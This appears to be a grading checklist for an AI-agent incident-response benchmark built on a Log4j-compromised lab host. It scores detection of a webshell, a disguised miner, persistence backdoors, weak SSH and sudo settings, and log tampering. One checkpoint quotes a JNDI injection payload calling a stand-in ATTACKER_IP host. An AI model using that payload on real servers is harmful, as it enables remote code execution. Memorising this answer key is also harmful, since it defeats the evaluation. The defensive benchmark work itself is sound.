# range-log4j-rce Checklist

Scoring criteria (ground truth) for evaluation. Each checkpoint is split into two independent scoring dimensions: detection score and plan score.

- **Detection score** (max 3 pts): Discovery(1) + Evidence(1) + Attribution(1) — judging the detection Agent's analysis report — LLM-as-a-Judge
- **Plan score** (max 2 pts): Correctness(1) + Completeness(1) — judging the repair plan output by the detection Agent — LLM-as-a-Judge
- **detection-only**: plan score marked N/A, excluded from the corresponding rollup

## Dimension 1: Intrusion entity identification and disposal (5 items)

### CHK-01: Webshell process detection `ENT-F01`
- **Evidence**: python3 webshell.py process listening on port 48888
- **Detection score** (3 pts)
  - Discovery: identified an abnormal Python HTTP service
  - Evidence: pointed out the process path `/opt/webapp/webshell.py`, listening on port 48888
  - Attribution: correlated the webshell with the Log4j JNDI exploitation chain
- **Plan score** (2 pts)
  - Correctness: the plan gives the correct process-termination command (kill / fuser -k 48888/tcp)
  - Completeness: the plan covers terminating the process + deleting the file + checking for any restart mechanism

### CHK-02: Mining process detection `ENT-P01`
- **Evidence**: process `/var/cache/.java-gc` is running, disguised as a Java GC helper
- **Detection score** (3 pts)
  - Discovery: identified the mining process
  - Evidence: pointed out the path `/var/cache/.java-gc`, recognized the disguised name
  - Attribution: correlated the mining process with the attacker's persistence behavior
- **Plan score** (2 pts)
  - Correctness: the plan gives the correct process-termination command
  - Completeness: the plan covers terminating the process + deleting the file + checking the daemon mechanism (systemd/crontab)

### CHK-03: Mining file cleanup `ENT-F02`
- **Evidence**: file `/var/cache/.java-gc` exists (bash script disguised as a binary)
- **Detection score** (3 pts)
  - Discovery: identified the malicious file
  - Evidence: pointed out the file path and type
  - Attribution: correlated with the mining behavior
- **Plan score** (2 pts)
  - Correctness: the plan gives the correct deletion command
  - Completeness: the plan recommends checking hidden locations such as /var/cache, /tmp for copies

### CHK-04: Webshell file cleanup `ENT-F01`
- **Evidence**: `/opt/webapp/webshell.py` or `/tmp/.ws.py` exists
- **Detection score** (3 pts)
  - Discovery: found an abnormal Python file
  - Evidence: pointed out the path and content (HTTP server accepting the `?c=` parameter to execute commands)
  - Attribution: identified as a backdoor file planted by the attacker
- **Plan score** (2 pts)
  - Correctness: the plan gives the correct deletion command
  - Completeness: the plan covers cleaning up the webshell file + Exploit.class

### CHK-05: Data-exfiltration file `ENT-F04`
- **Evidence**: `/tmp/.db_dump` exists, containing database export content
- **Detection score** (3 pts)
  - Discovery: found the database dump file
  - Evidence: pointed out the path and content (including user credentials, API Keys)
  - Attribution: identified as a product of the attacker's information-gathering stage
- **Plan score** (2 pts)
  - Correctness: the plan recommends preserving it first for forensic analysis, recording the scope of data leakage
  - Completeness: the plan covers forensic preservation + subsequent cleanup + rotation recommendation for affected credentials

## Dimension 2: Baseline risk (6 items)

### CHK-06: Log4j2 vulnerable version `VUL-01`
- **Evidence**: `/opt/webapp/lib/log4j-core-2.14.1.jar` — CVE-2021-44228
- **Detection score** (3 pts)
  - Discovery: identified that Log4j2 2.14.1 has a known RCE vulnerability
  - Evidence: pointed out the jar package path and version number, cited CVE-2021-44228
  - Attribution: correlated this vulnerability with the initial intrusion entry point
- **Plan score** (2 pts)
  - Correctness: the plan recommends upgrading to 2.17.1+ or applying mitigation measures (setting log4j2.formatMsgNoLookups=true)
  - Completeness: the plan covers stopping the service → replacing the jar → restarting + verification measures

### CHK-07: SSH PermitRootLogin `BAS-01`
- **Evidence**: `PermitRootLogin yes` in `/etc/ssh/sshd_config`
- **Detection score** (3 pts)
  - Discovery: the report mentions the risk of PermitRootLogin
  - Evidence: cited the specific configuration line in sshd_config
  - Attribution: pointed out that allowing direct root SSH login increases brute-force risk
- **Plan score** (2 pts)
  - Correctness: the plan recommends changing it to `no` or `prohibit-password`
  - Completeness: the plan includes `sshd -t` verification and restart steps

### CHK-08: SSH MaxAuthTries too high `BAS-01`
- **Evidence**: `MaxAuthTries 100` in `/etc/ssh/sshd_config`
- **Detection score** (3 pts)
  - Discovery: identified that the MaxAuthTries setting is insecure
  - Evidence: cited the configuration line and the specific value 100
  - Attribution: explained how this setting amplifies brute-force risk
- **Plan score** (2 pts)
  - Correctness: the plan recommends changing MaxAuthTries to a reasonable value (3-6)
  - Completeness: the plan includes the step of restarting sshd

### CHK-09: app user weak password `BAS-03`
- **Evidence**: the app user's password is `app2024`
- **Detection score** (3 pts)
  - Discovery: identified that a system user uses a weak password
  - Evidence: found via password-policy check or shadow file analysis
  - Attribution: a weak password can be brute-forced or exploited via social engineering
- **Plan score** (2 pts)
  - Correctness: the plan recommends replacing it with a strong password (16+ characters, including uppercase, lowercase, digits, special characters)
  - Completeness: the plan covers password change + password-policy hardening (PAM)

### CHK-10: Sudo NOPASSWD overly broad `BAS-04`
- **Evidence**: `/etc/sudoers.d/app-deploy` allows the app user to run `/opt/webapp/deploy.sh` with NOPASSWD
- **Detection score** (3 pts)
  - Discovery: identified the sudoers configuration risk
  - Evidence: cited the sudoers file content
  - Attribution: explained that a writable script + NOPASSWD = direct privilege escalation
- **Plan score** (2 pts)
  - Correctness: the plan recommends removing NOPASSWD or restricting deploy.sh to root-write-only
  - Completeness: the plan covers sudoers modification + script permission hardening + visudo verification

### CHK-11: JNDI remote class-loading config `VUL-01`
- **Evidence**: `System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true")` in VulnWebApp.java
- **Detection score** (3 pts)
  - Discovery: identified that the JNDI security configuration was explicitly relaxed
  - Evidence: pointed out the code location and property name
  - Attribution: explained that this configuration allows remote code loading and is a precondition for the attack to work
- **Plan score** (2 pts)
  - Correctness: the plan recommends removing this System.setProperty or setting it to false
  - Completeness: the plan covers code modification + recompilation + service restart

## Dimension 3: Persistence detection and removal (4 items)

### CHK-12: Systemd persistence backdoor `PER-V01`
- **Evidence**: `/etc/systemd/system/java-gc-helper.service` (enabled state)
- **Detection score** (3 pts)
  - Discovery: found a suspicious systemd service unit
  - Evidence: pointed out the service name and file path, showed the ExecStart content
  - Attribution: identified as a persistent mining service planted by the attacker
- **Plan score** (2 pts)
  - Correctness: the plan includes stop + disable + deleting the .service file + daemon-reload
  - Completeness: the plan covers the complete cleanup process and verification steps

### CHK-13: Crontab persistence `PER-S01`
- **Evidence**: `*/5 * * * * /var/cache/.java-gc` exists in root crontab
- **Detection score** (3 pts)
  - Discovery: found a suspicious crontab entry
  - Evidence: showed the crontab content
  - Attribution: identified as a persistence mechanism that periodically restarts the mining process
- **Plan score** (2 pts)
  - Correctness: the plan gives the correct crontab deletion command
  - Completeness: the plan recommends checking other cron directories such as /etc/cron.d/

### CHK-14: SSH public-key injection `PER-A01`
- **Evidence**: the `ops@internal-ci` public key exists in `/root/.ssh/authorized_keys`
- **Detection score** (3 pts)
  - Discovery: found an unauthorized SSH public key
  - Evidence: pointed out the public-key content and user identifier (ops@internal-ci)
  - Attribution: identified as a persistent remote-access backdoor planted by the attacker
- **Plan score** (2 pts)
  - Correctness: the plan gives the command to remove the specific public key
  - Completeness: the plan recommends reviewing the authorized_keys of all users

### CHK-15: Profile.d backdoor `PER-I01`
- **Evidence**: `/etc/profile.d/java-env.sh` exists, containing hidden mining-launch logic
- **Detection score** (3 pts)
  - Discovery: found a suspicious profile.d script
  - Evidence: showed the file content, pointed out the hidden mining-launch command within
  - Attribution: identified as a login-triggered persistence backdoor
- **Plan score** (2 pts)
  - Correctness: the plan gives the command to delete the file
  - Completeness: the plan recommends reviewing all scripts under /etc/profile.d/

## Dimension 4: Attribution and timeline (4 items)

### CHK-16: JNDI attack-entry identification `Q-01`  *detection-only*
- **Evidence**: the webapp log `/opt/webapp/logs/app.log` contains a `${jndi:ldap://ATTACKER_IP:1389/a}` record
- **Detection score** (3 pts)
  - Discovery: identified Log4j JNDI injection as the initial intrusion entry point
  - Evidence: cited the specific log line in app.log, pointed out the JNDI payload
  - Attribution: correctly correlated the JNDI injection with the subsequent webshell deployment
- **Plan score**: N/A

### CHK-17: Privilege-escalation path reconstruction `Q-02`  *detection-only*
- **Evidence**: `/opt/webapp/deploy.sh` has been tampered with + sudo log
- **Detection score** (3 pts)
  - Discovery: reconstructed the path by which the app user completed privilege escalation via rewriting deploy.sh + sudo
  - Evidence: showed the modified content and timestamp of deploy.sh, cited the sudo audit log
  - Attribution: fully described the privilege-escalation chain: app user can write deploy.sh → NOPASSWD sudo → root
- **Plan score**: N/A

### CHK-18: Attacker-IP attribution `Q-03`  *detection-only*
- **Evidence**: the attacker IP in app.log / webshell access logs
- **Detection score** (3 pts)
  - Discovery: identified and reported the attacker IP address
  - Evidence: extracted the attacker IP from the application logs or network connections
  - Attribution: correlated the attacker IP with the attack behaviors at each stage
- **Plan score**: N/A

### CHK-19: Log-tampering discovery `Q-02`  *detection-only*
- **Evidence**: the `/var/log/auth.log` file was cleared (size=0)
- **Detection score** (3 pts)
  - Discovery: found that a key log was abnormally cleared
  - Evidence: pointed out that the auth.log file size is 0 and its mtime is abnormal
  - Attribution: identified as the attacker's anti-forensic behavior, analyzed what the original log might have contained
- **Plan score**: N/A

## Dimension 5: Remediation closure (3 items)

### CHK-20: Log4j upgrade remediation `VUL-01`
- **Evidence**: after upgrade, the log4j-core jar version ≥ 2.17.1
- **Detection score** (3 pts)
  - Discovery: the plan explicitly proposes upgrading Log4j
  - Evidence: specifies the target version and operation steps
  - Attribution: correlated the upgrade with sealing off the initial intrusion entry point
- **Plan score** (2 pts)
  - Correctness: the plan specifies the correct secure version number
  - Completeness: the plan covers the complete process of stopping the service → replacing → restarting → verifying

### CHK-21: Deploy.sh permission hardening `ENT-F05` `BAS-04`
- **Evidence**: `/opt/webapp/deploy.sh` restored to its original content and permissions tightened
- **Detection score** (3 pts)
  - Discovery: identified the security risk of deploy.sh being tampered with
  - Evidence: showed the current content and permissions of the file
  - Attribution: correlated with the privilege-escalation path
- **Plan score** (2 pts)
  - Correctness: the plan recommends restoring deploy.sh + tightening file permissions (root-write-only)
  - Completeness: the plan covers file restoration + permission modification + sudoers hardening

### CHK-22: Password hardening `BAS-03`
- **Evidence**: root and app user passwords have been changed to strong passwords
- **Detection score** (3 pts)
  - Discovery: the report proposes password-security recommendations
  - Evidence: pointed out which users use weak passwords
  - Attribution: explained how weak passwords facilitate the attack chain
- **Plan score** (2 pts)
  - Correctness: the plan recommends a specific password policy
  - Completeness: the plan covers all weak-password users + password-policy configuration
